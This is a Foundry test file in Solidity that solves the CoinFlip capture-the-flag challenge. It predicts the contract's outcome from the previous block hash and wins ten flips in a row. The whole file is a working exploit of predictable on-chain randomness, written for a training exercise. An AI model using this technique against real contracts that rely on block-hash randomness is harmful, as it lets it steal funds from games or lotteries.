// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";
import "../src/3-CoinFlip.sol";

contract CoinFlipTest is Test {
    using SafeMath for uint256;

    uint256 public constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinFlipCTF;

    function setUp() public {
        coinFlipCTF = new CoinFlip();
    }

    function _guessFlip(bool _guess) internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            return true;
        } else {
            return false;
        }
    }

    function testAttack() public {
        for (uint256 i = 0; i < 10; i++) {
            bool nextGuess = _guessFlip(true);
            coinFlipCTF.flip(nextGuess);

            // advance block
            vm.roll(block.number + 1);
        }

        assertEq(coinFlipCTF.consecutiveWins(), 10);
    }

    receive() external payable {}
}
